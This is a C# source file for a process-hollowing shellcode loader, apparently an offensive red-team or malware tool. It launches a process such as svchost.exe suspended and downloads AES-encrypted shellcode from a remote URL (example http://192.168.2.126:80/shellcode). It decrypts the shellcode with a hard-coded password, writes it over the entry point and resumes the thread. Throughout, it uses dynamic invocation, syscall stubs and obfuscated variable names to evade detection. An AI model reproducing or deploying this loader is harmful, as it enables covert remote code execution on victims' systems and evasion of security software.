using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using DeeInvok.DynamicInvocation;

namespace ProcessHollow {
	public class Program {
		static void Main(string[] args) {
			string currentBinary = AppDomain.CurrentDomain.FriendlyName;
			string kThirtyTwo = "kernel32.dll";

			if (args.Length != 2) {
				Console.WriteLine($"Usage: {currentBinary} <aesEncryptedShellcodeUrl> <process>");
				Console.WriteLine($"Usage: {currentBinary} 'http://192.168.2.126:80/shellcode' 'C:\\Windows\\System32\\svchost.exe'");
				Environment.Exit(0);
			}

			STARTUPINFOEX si = new STARTUPINFOEX();

			string yuuErEl = args[0];
			string process = args[1];

			var pa = new SECURITY_ATTRIBUTES();
			var ta = new SECURITY_ATTRIBUTES();
			pa.nLength = Marshal.SizeOf(pa);
			ta.nLength = Marshal.SizeOf(ta);

			// function params to pass to CreateProcessA dynamic invoke
			var funcPrms = new object[] {
				null,
				process, 
				pa, 
				ta, 
				false, 
				CreationFlags.START_SUSPENDED,
				IntPtr.Zero, 
				null, 
				si,
				// this null should be "ref pi", but we can't declare ref as variable so we add this value to "pi" later
				null
			};

			Generic.DynamicAPIInvoke(kThirtyTwo, "CreateProcessA", typeof(StructsAndDelegates.CreateProcess), ref funcPrms, true);

			// we can't use the "ref" keyword in arrays, so we manually pass the value from the array to the variable
			PROCESS_INFORMATION pi = (PROCESS_INFORMATION)funcPrms[9];
			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

			uint tmp = 0;
			IntPtr hProcess = pi.hProcess;
			uint status = 1;
			IntPtr syscall = IntPtr.Zero;

			syscall = Generic.GetSyscallStub("ZwQueryInformationProcess");
			StructsAndDelegates.ZwQueryInformationProcess sysQueryInfoProc = (StructsAndDelegates.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(syscall, typeof(StructsAndDelegates.ZwQueryInformationProcess));
			status = sysQueryInfoProc(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

			IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
			byte[] addrBuf = new byte[IntPtr.Size];
			IntPtr nRead = IntPtr.Zero;

			// function params to pass to ReadProcess dynamic invoke
			funcPrms = new object[] {
				hProcess, 
				ptrToImageBase, 
				addrBuf, 
				addrBuf.Length, 
				null
			};
			Generic.DynamicAPIInvoke(kThirtyTwo, "ReadProcessMemory", typeof(StructsAndDelegates.ReadProcessMemory), ref funcPrms, true);

			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

			// Parse PE Header
			byte[] data = new byte[0x200];
			// function params to pass to ReadProcess dynamic invoke
			funcPrms = new object[] {
				hProcess, 
				svchostBase, 
				data, 
				data.Length, 
				null
			};
			Generic.DynamicAPIInvoke(kThirtyTwo, "ReadProcessMemory", typeof(StructsAndDelegates.ReadProcessMemory), ref funcPrms, true);

			// Do some offset calculation magic to find the address of the process' entry point where we can inject our shellcode
			uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
			uint opthdr = e_lfanew_offset + 0x28;
			uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
			IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

			byte[] parsed = Neerladen(yuuErEl);

			// IMPORTANT: PASSWORD FOR AES DECRYPTION
			byte[] passwordBytes = Encoding.UTF8.GetBytes("fishfish");
			passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

			byte[] decParsed = AES_Decrypt(parsed, passwordBytes);
			IntPtr size = (IntPtr)decParsed.Length;
			uint oldProt = 0;

			// convert byte[] to IntPtr for NtWriteVirtualMemory
			IntPtr buffer = Marshal.AllocHGlobal(decParsed.Length);
			Marshal.Copy(decParsed, 0, buffer, decParsed.Length);

			// function params to pass to WriteProcessMemory dynamic invoke
			//TODO: replace with syscalls as shown in the comments below once I figure out why it's not working that way
			funcPrms = new object[] {
				hProcess,
				addressOfEntryPoint,
				decParsed,
				decParsed.Length,
				nRead
			};
			Generic.DynamicAPIInvoke(kThirtyTwo, "WriteProcessMemory", typeof(StructsAndDelegates.WriteProcessMemory), ref funcPrms, true);

			// something is wrong here, need to fix it
			//uint bytesWritten = 0;
			//syscall = Generic.GetSyscallStub("NtWriteVirtualMemory");
			//Native.DELEGATES.NtWriteVirtualMemory sysWriteVMem = (Native.DELEGATES.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtWriteVirtualMemory));
			//status = sysWriteVMem(hProcess, addressOfEntryPoint, buffer, (uint)decParsed.Length, ref bytesWritten);

			//syscall = Generic.GetSyscallStub("NtProtectVirtualMemory");
			//Native.DELEGATES.NtProtectVirtualMemory sysProtVMem = (Native.DELEGATES.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(Native.DELEGATES.NtProtectVirtualMemory));
			//status = sysProtVMem(hProcess, ref addressOfEntryPoint, ref size, 0x20, ref oldProt);

			uint susCount = 0;
			syscall = Generic.GetSyscallStub("NtResumeThread");
			StructsAndDelegates.NtResumeThread sysResumeThread = (StructsAndDelegates.NtResumeThread)Marshal.GetDelegateForFunctionPointer(syscall, typeof(StructsAndDelegates.NtResumeThread));
			var o = sysResumeThread(pi.hThread, ref susCount);
		}

		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes) {
			byte[] decryptedBytes = null;
			byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

			using (MemoryStream ms = new MemoryStream()) {
				using (RijndaelManaged AES = new RijndaelManaged()) {
					AES.KeySize = 256;
					AES.BlockSize = 128;

					var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);

					AES.Mode = CipherMode.CBC;

					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)) {
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}

			return decryptedBytes;
		}

		private static byte[] Neerladen(string yuuErEl) {
			WebClient webKlant;

			try {
				// TLS 1.0, 1.1 and 1.2
				ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
				webKlant = new WebClient();

				return webKlant.DownloadData(yuuErEl);
			} catch (Exception ex) {
				Console.WriteLine(ex);
			}

			Environment.Exit(0);
			return null;
		}
	}
}